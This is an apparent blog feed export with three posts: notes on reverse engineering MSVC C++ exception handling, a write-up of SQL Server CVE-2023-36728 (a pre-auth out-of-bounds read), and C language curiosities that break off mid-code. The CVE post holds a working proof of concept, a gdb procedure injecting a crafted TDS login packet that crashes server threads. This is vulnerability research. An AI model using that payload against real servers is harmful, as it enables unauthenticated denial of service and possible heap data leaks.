会调用<code>_ChangePassword__onSyncRequest____1___dtor$0</code>.</p><p><code>TryBlockMapEntry</code>:</p><p><img src="/images/CPlusPlus_Exception.assets/1712134847779.png" alt="1712134847779"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TryBlockMapEntry</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> tryLow;</span><br><span class="line">    <span class="type">int</span> tryHigh;    <span class="comment">// this try &#123;&#125; covers states ranging from tryLow to tryHigh</span></span><br><span class="line">    <span class="type">int</span> catchHigh;  <span class="comment">// highest state inside catch handlers of this try</span></span><br><span class="line">    <span class="type">int</span> nCatches;   <span class="comment">// number of catch handlers</span></span><br><span class="line">    HandlerType* pHandlerArray; <span class="comment">//catch handlers table</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">HandlerType</span> &#123;</span></span><br><span class="line">  <span class="comment">// 0x01: const, 0x02: volatile, 0x08: reference</span></span><br><span class="line">  DWORD adjectives;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// RTTI descriptor of the exception type. 0=any (ellipsis)</span></span><br><span class="line">  TypeDescriptor* pType;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ebp-based offset of the exception object in the function stack.</span></span><br><span class="line">  <span class="comment">// 0 = no object (catch by type)</span></span><br><span class="line">  <span class="type">int</span> dispCatchObj;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// address of the catch handler code.</span></span><br><span class="line">  <span class="comment">// returns address where to continues execution (i.e. code after the try block)</span></span><br><span class="line">  <span class="type">void</span>* addressOfHandler;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>IPtoStateMap</code>:</p><p><img src="/images/CPlusPlus_Exception.assets/1712136119507.png" alt="1712136119507"></p><p>在x86中, 它是在栈中显式地声明当前的state, 在x64中, 通过 <code>IptoStateMapEntry </code> 隐式地展示当前的state. 所以当到达表里的rva时, 表示当前的state为多少. 比如这里就是到达<code>loc_180006A99</code>时, state为 2.</p><p>对比win10及以上的版本, 会发现有明显的不一样的情况.(以下是win11版本的unwind map)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0000000180035698     byte_180035698  db 78h                  ; DATA XREF: .rdata:0000000180035694↑o</span><br><span class="line">.rdata:0000000180035698                                             ; FuncInfo4</span><br><span class="line">.rdata:0000000180035699                     dd rva byte_1800356A5   ; unwind map</span><br><span class="line">.rdata:000000018003569D                     dd rva byte_1800356B9   ; try block map</span><br><span class="line">.rdata:00000001800356A1                     dd rva byte_1800356DB   ; ip2state map</span><br><span class="line">.rdata:00000001800356A5     byte_1800356A5  db 0Ah                  ; DATA XREF: .rdata:0000000180035699↑o</span><br><span class="line">.rdata:00000001800356A5                                             ; num unwind entries: 5</span><br><span class="line">.rdata:00000001800356A6                     db 8                    ; funclet type: 0</span><br><span class="line">.rdata:00000001800356A7                     db 0Ah                  ; funclet type: 1</span><br><span class="line">.rdata:00000001800356A8                     dd rva ??1IASRequest@IASTL@@QEAA@XZ ; funclet</span><br><span class="line">.rdata:00000001800356AC                     db 50h                  ; frame offset of object ptr to be destructed</span><br><span class="line">.rdata:00000001800356AD                     db 32h                  ; funclet type: 1</span><br><span class="line">.rdata:00000001800356AE                     dd rva ??1IASAttribute@IASTL@@QEAA@XZ ; funclet</span><br><span class="line">.rdata:00000001800356B2                     db 0C0h                 ; frame offset of object ptr to be destructed</span><br><span class="line">.rdata:00000001800356B3                     db 6Eh                  ; funclet type: 3</span><br><span class="line">.rdata:00000001800356B4                     dd rva __std_terminate  ; funclet</span><br></pre></td></tr></table></figure><p><code>byte_1800356A5</code> 的unwind map, 是有rva的, 但是前一个字节是什么意义, 我还不太懂.</p><h2 id="导览图方法"><a href="#导览图方法" class="headerlink" title="导览图方法"></a>导览图方法</h2><p><img src="/images/CPlusPlus_Exception.assets/1712115551300.png" alt="1712115551300"></p><p>在目标函数里直接ida看导览图, 就可以看到ida识别的异常处理流. </p><p>析构操作<strong>可能</strong>会以这样的形式存在:</p><p><img src="/images/CPlusPlus_Exception.assets/1712115649867.png" alt="1712115649867"></p><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><p>另外, 形如:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>() &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">    ~<span class="built_in">MyClass</span>() &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">    <span class="comment">// 其他成员函数和变量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个对象并使用 unique_ptr 管理</span></span><br><span class="line"><span class="function">std::unique_ptr&lt;MyClass&gt; <span class="title">createUniqueObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">unique_ptr</span>&lt;MyClass&gt;(<span class="keyword">new</span> <span class="built_in">MyClass</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::unique_ptr&lt;MyClass&gt; myUniquePtr = <span class="built_in">createUniqueObject</span>();</span><br><span class="line">    <span class="comment">// 使用 myUniquePtr ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>() &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">    ~<span class="built_in">MyClass</span>() &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">    <span class="comment">// 其他成员函数和变量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个对象并使用 shared_ptr 管理</span></span><br><span class="line"><span class="function">std::shared_ptr&lt;MyClass&gt; <span class="title">createSharedObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">shared_ptr</span>&lt;MyClass&gt;(<span class="keyword">new</span> <span class="built_in">MyClass</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::shared_ptr&lt;MyClass&gt; mySharedPtr = <span class="built_in">createSharedObject</span>();</span><br><span class="line">    <span class="comment">// 使用 mySharedPtr ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种, 也都会自动触发析构操作, 即使发生了异常也会如此.</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.openrce.org/articles/full_view/21">https://www.openrce.org/articles/full_view/21</a> 介绍基本原理</p><p><a href="https://reactos.org/wiki/Techwiki:SEH64">https://reactos.org/wiki/Techwiki:SEH64</a> 第一个引用中涉及到的结构体出处</p><p><a href="https://learn.microsoft.com/en-us/cpp/build/exception-handling-x64?view=msvc-160">https://learn.microsoft.com/en-us/cpp/build/exception-handling-x64?view=msvc-160</a> 一些相关结构体</p><p><a href="http://www.hexblog.com/wp-content/uploads/2012/06/Recon-2012-Skochinsky-Compiler-Internals.pdf">http://www.hexblog.com/wp-content/uploads/2012/06/Recon-2012-Skochinsky-Compiler-Internals.pdf</a> 介绍x64与x86的差异</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;偶尔分析C++的模块, 遇到触发异常操作, 但是不知道它SEH到底干啥了, 所以研究了下MSVC下的c++异常处理到底是怎么回事, 没理解透彻, 但是逆向应该是够用了, 如果有不对之处, 还望指正.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Windows SQL Server Pre-Auth Overflow Read(CVE-2023-36728)</title>
    <link href="http://474172261.github.io/2023/10/16/sqlserver-dos-CVE-2023-36728/"/>
    <id>http://474172261.github.io/2023/10/16/sqlserver-dos-CVE-2023-36728/</id>
    <published>2023-10-16T02:08:37.067Z</published>
    <updated>2023-10-16T02:11:25.387Z</updated>
    
    <content type="html"><![CDATA[<p>这个是一个sql server的未认证远程dos的bug解析.</p><span id="more"></span><h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p><strong>SQL Server Version</strong>: sql server 2022.160.4035.4</p><p><strong>Host System</strong>: windows 1809</p><h2 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h2><p>in file <code>sqllang.dll</code> version <code>2022.160.4035.4</code>, function <code>CFedAuthFeatureExtension::ReadIDCRLToken</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">v4 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( !*a3 )</span><br><span class="line">&#123;</span><br><span class="line">  *(_DWORD *)a4 = <span class="number">9</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br><span class="line">v8 = a2 + <span class="number">4</span>;</span><br><span class="line">len1 = *(<span class="type">unsigned</span> <span class="type">int</span> *)a2;</span><br><span class="line">v10 = *a3 - <span class="number">4</span>;</span><br><span class="line"><span class="keyword">if</span> ( *a3 == <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *(_DWORD *)a4 = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  *((_DWORD *)this + <span class="number">28</span>) = v10 - (len1 + <span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v10 &gt;= (<span class="type">int</span>)len1 + <span class="number">0x40</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _mm_lfence();</span><br><span class="line">    v11 = <span class="number">2</span>i64 * (((<span class="type">unsigned</span> <span class="type">int</span>)len1 &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !is_mul_ok(((<span class="type">unsigned</span> <span class="type">int</span>)len1 &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>, <span class="number">2u</span>i64) )</span><br><span class="line">      v11 = <span class="number">-1</span>i64;</span><br><span class="line">    v12 = operator new[](v11, *((<span class="keyword">struct</span> IMemObj **)this + <span class="number">2</span>), <span class="number">1</span>, <span class="string">&quot;sql\\ntdbms\\tds\\src\\featureext.cpp&quot;</span>, <span class="number">1585</span>, <span class="number">3u</span>);</span><br><span class="line">    *((_QWORD *)this + <span class="number">7</span>) = v12;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      _mm_lfence();</span><br><span class="line">      memcpy_s(*((<span class="type">void</span> *<span class="type">const</span> *)this + <span class="number">7</span>), len1, v8, len1);</span><br></pre></td></tr></table></figure><p>*a3 means data length, a2 is a buffer controlled by user.</p><p>at line 9, if we let <code>*a3==3</code>, then v10 will be 0xffffffff. And at line 28, it will overflow read from a2.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>Though process doesn’t crash(only thread crashed), it will cause extra problems, for example, if it crashed many times, no one can login into the server, even through local SSMS. And sql server configuration manager can’t restart service. Furthermore, it overflows reads data from heap, may leak important information with extra skills.</p><h2 id="Crash-Stack-Trace"><a href="#Crash-Stack-Trace" class="headerlink" title="Crash Stack Trace"></a>Crash Stack Trace</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">(168c.27a4): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">sqllang!memcpy+0x180:</span><br><span class="line">00007ffd`78f382fc c4a17e6f6c02e0  vmovdqu ymm5,ymmword ptr [rdx+r8-20h] ds:000001c2`20ff9b3d=??</span><br><span class="line">0:019&gt; k</span><br><span class="line"> # Child-SP          RetAddr               Call Site</span><br><span class="line">00 0000008f`407fe9e8 00007ffd`78f33493     sqllang!memcpy+0x180</span><br><span class="line">01 0000008f`407fe9f0 00007ffd`79a99658     sqllang!memcpy_s+0x5e</span><br><span class="line">02 0000008f`407fea20 00007ffd`79a99525     sqllang!CFedAuthFeatureExtension::ReadIDCRLToken+0xe6</span><br><span class="line">03 0000008f`407fea80 00007ffd`78f955b9     sqllang!CFedAuthFeatureExtension::ParseFeatureData+0x245</span><br><span class="line">04 0000008f`407fead0 00007ffd`78f93f6f     sqllang!CPhysicalConnection::FParseFeatureExtension+0x29e</span><br><span class="line">05 0000008f`407fec30 00007ffd`78f93c8e     sqllang!CPhysicalConnection::FCreateLoginRec+0x6dd</span><br><span class="line">06 0000008f`407feea0 00007ffd`78f93b0b     sqllang!process_login+0x24e</span><br><span class="line">07 0000008f`407fef40 00007ffd`78f46c30     sqllang!process_commands_internal+0x45b</span><br><span class="line">08 0000008f`407ff080 00007ffd`7ef088db     sqllang!process_messages+0x1e0</span><br><span class="line">09 0000008f`407ff230 00007ffd`7ef09298     sqldk!SOS_Task::Param::Execute+0x232</span><br><span class="line">0a 0000008f`407ff830 00007ffd`7ef08df4     sqldk!SOS_Scheduler::RunTask+0x182</span><br><span class="line">0b 0000008f`407ff930 00007ffd`7ef28293     sqldk!SOS_Scheduler::ProcessTasks+0x344</span><br><span class="line">0c 0000008f`407ffa80 00007ffd`7ef2833c     sqldk!Worker::EntryPoint+0x2f9</span><br><span class="line">0d 0000008f`407ffb60 00007ffd`7ef27f7f     sqldk!ThreadScheduler::RunWorker+0xc</span><br><span class="line">0e 0000008f`407ffb90 00007ffd`7ef27c65     sqldk!SystemThreadDispatcher::ProcessWorker+0x589</span><br><span class="line">0f 0000008f`407ffc70 00007ffd`b8447e94     sqldk!SchedulerManager::ThreadEntryPoint+0x3cf</span><br><span class="line">10 0000008f`407ffd80 00007ffd`babf7ad1     KERNEL32!BaseThreadInitThunk+0x14</span><br><span class="line">11 0000008f`407ffdb0 00000000`00000000     ntdll!RtlUserThreadStart+0x21</span><br><span class="line">0:019&gt; r</span><br><span class="line">rax=000001c226000040 rbx=0000000000ccffff rcx=000001c226000040</span><br><span class="line">rdx=000001c220329b5e rsi=000001c220329b5e rdi=0000000000ccffff</span><br><span class="line">rip=00007ffd78f382fc rsp=0000008f407fe9e8 rbp=00000000ffffffff</span><br><span class="line"> r8=0000000000ccffff  r9=000001c220ff9b5d r10=00007ffd78f30000</span><br><span class="line">r11=0000008f407fe928 r12=0000000000000000 r13=000001c220329b5e</span><br><span class="line">r14=0000000000ccffff r15=0000000000668000</span><br><span class="line">iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206</span><br><span class="line">sqllang!memcpy+0x180:</span><br><span class="line">00007ffd`78f382fc c4a17e6f6c02e0  vmovdqu ymm5,ymmword ptr [rdx+r8-20h] ds:000001c2`20ff9b3d=??</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ol><li><p>install sqlcmd in Centos7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo rpm -i msodbcsql17-17.2.0.1-1.x86_64.rpm</span><br><span class="line">$ sudo rpm -i mssql-tools-17.2.0.1-1.x86_64.rpm</span><br></pre></td></tr></table></figure></li><li><p>install gdb in Centos7</p></li><li><p>create a new SQL Server 2022(I tested locally, I can give a Azure Sql Server test case if you need)</p></li><li><p>connect SQL Server to Azure AD by (<a href="https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/azure-ad-authentication-sql-server-setup-tutorial?view=sql-server-ver16">https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/azure-ad-authentication-sql-server-setup-tutorial?view=sql-server-ver16</a>)</p></li><li><p>install windbg in SQL Server machine</p></li><li><p>the sql server should be like this, in this picture, target process is 5772<img src="/images/sqlserver-dos-CVE-2023-36728.assets/1686738413775.png" alt="1686738413775"></p></li><li><p>use windbg attach 5772</p></li><li><p>in Centos:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ gdb  --args /opt/mssql-tools/bin/sqlcmd   -S 192.168.150.141,50128 -G -C -U &quot;aabb&quot; -P &quot;a&quot;</span><br><span class="line">gdb$ b main</span><br><span class="line">gdb$ r</span><br><span class="line">gdb$ b send</span><br><span class="line">gdb$ c</span><br><span class="line">Breakpoint 2, 0x00007ffff6b30be0 in send () from /lib64/libpthread.so.0</span><br><span class="line">gdb$ b SSL_write</span><br><span class="line">gdb$ disa 1 2</span><br><span class="line">gdb$ c</span><br><span class="line">Breakpoint 3, 0x00007fffee1f5740 in SSL_write () from /lib64/libssl.so.10</span><br><span class="line">gdb$ set &#123;char[241]&#125;$rsi=&quot;\x10\x01\x00\xe5\x00\x00\x00\x00\xdd\x00\x00\x00\x04\x00\x00\x74\x00\x10\x00\x00\x00\x00\x00\x07\xbb\xaa\x00\x00\x00\x00\x00\x00\xe0\x03\x00\x10\xf0\x00\x00\x00\x09\x04\x00\x00\x5e\x00\x0a\x00\x72\x00\x00\x00\x72\x00\x00\x00\x72\x00\x0c\x00\x8a\x00\x0f\x00\xd0\x00\x04\x00\x8e\x00\x0e\x00\xaa\x00\x00\x00\xaa\x00\x06\x00\x00\xe0\x4c\x68\x0d\x9c\xb6\x00\x00\x00\xb6\x00\x00\x00\xb6\x00\x00\x00\x00\x00\x00\x00\x54\x00\x65\x00\x73\x00\x74\x00\x43\x00\x6c\x00\x69\x00\x65\x00\x6e\x00\x74\x00\x50\x00\x79\x00\x54\x00\x65\x00\x73\x00\x74\x00\x43\x00\x6c\x00\x69\x00\x65\x00\x6e\x00\x74\x00\x31\x00\x39\x00\x32\x00\x2e\x00\x31\x00\x36\x00\x38\x00\x2e\x00\x31\x00\x35\x00\x30\x00\x2e\x00\x31\x00\x34\x00\x31\x00\x50\x00\x79\x00\x20\x00\x54\x00\x44\x00\x53\x00\x20\x00\x6c\x00\x69\x00\x62\x00\x72\x00\x61\x00\x72\x00\x79\x00\x6d\x00\x61\x00\x73\x00\x74\x00\x65\x00\x72\x00\xd4\x00\x00\x00\x02\x04\x00\x00\x00\x00\xff\xff\xcc&quot;</span><br><span class="line">gdb$ set $rdx=0xE5</span><br><span class="line">gdb$ set $r12=0xe5</span><br><span class="line">gdb$ c</span><br></pre></td></tr></table></figure></li><li><p>in SQL Server, windbg:</p><p><img src="/images/sqlserver-dos-CVE-2023-36728.assets/1686738647013.png" alt="1686738647013"></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;这个是一个sql server的未认证远程dos的bug解析.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>奇怪的知识又增加了</title>
    <link href="http://474172261.github.io/2023/10/11/unusual_knowledge/"/>
    <id>http://474172261.github.io/2023/10/11/unusual_knowledge/</id>
    <published>2023-10-11T09:27:42.152Z</published>
    <updated>2024-07-03T02:24:44.499Z</updated>
    
    <content type="html"><![CDATA[<p>关于技术的一些奇奇怪怪的知识点</p><span id="more"></span><h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><p>include本质就是把include的文件内容拷贝到当前插入include的位置.<br>所以就可以有一些奇怪的用法:<br>a.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _AAA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _AAA</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>a.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">1</span>)&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;a.h&quot;</span></span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="c的结构体"><a href="#c的结构体" class="headerlink" title="c的结构体"></a>c的结构体</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">struct new1 &#123;</span><br><span class="line">    int a1;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct a2 &#123;</span><br><span class="line">    struct new1;// 这个位置我们没有给结构体变量名</span><br><span class="line">    int a22;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    struct a2 b1;</span><br><span class="line">    b1.a1;// 但是, 我们可以直接引用结构体的成员!</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="int-到-size-t"><a href="#int-到-size-t" class="headerlink" title="int 到 size_t"></a>int 到 size_t</h2><p>对于x64, 无论是gcc还是msvc, 编译<code>int a=-1;size_t new = (size_t)a;</code>的结果, new都是0xffffffffffffffff.</p><h2 id="关于clone的编写bug"><a href="#关于clone的编写bug" class="headerlink" title="关于clone的编写bug"></a>关于clone的编写bug</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">this_pthread_create</span><span class="params">(<span class="type">int</span> *tid, <span class="type">void</span>(*thread_func)(<span class="type">void</span> *), <span class="type">void</span> *arg, <span class="type">void</span> *stack_end)</span>&#123;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    *(<span class="type">long</span>*)(stack_end<span class="number">-0x100</span>) = (<span class="type">long</span>)thread_func;</span><br><span class="line">    *(<span class="type">long</span>*)(stack_end<span class="number">-0x108</span>) = (<span class="type">long</span>)arg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// __asm__ __volatile__ (</span></span><br><span class="line">    <span class="comment">//     &quot;movq $56, %%rax\n\t&quot;  // syscall number for clone</span></span><br><span class="line">    <span class="comment">//     &quot;movl %1, %%edi\n\t&quot;   // flags</span></span><br><span class="line">    <span class="comment">//     &quot;movq %2, %%rsi;\n\t&quot;         // child_stack</span></span><br><span class="line">    <span class="comment">//     &quot;xorq %%rdx, %%rdx;\n\t&quot;         // ptid (NULL)</span></span><br><span class="line">    <span class="comment">//     &quot;xorq %%r10, %%r10;\n\t&quot;         // ctid (NULL)</span></span><br><span class="line">    <span class="comment">//     &quot;movq %3, %%r8;\n\t&quot;          // newtls (NULL)</span></span><br><span class="line">    <span class="comment">//     &quot;syscall;\n\t&quot;               // make the system call</span></span><br><span class="line">    <span class="comment">//     &quot;movl %%eax, %0;&quot;         // store the return value in pid</span></span><br><span class="line">    <span class="comment">//     : &quot;=r&quot; (pid)</span></span><br><span class="line">    <span class="comment">//     : &quot;r&quot;(CLONE_VM | CLONE_FS | CLONE_FILES | 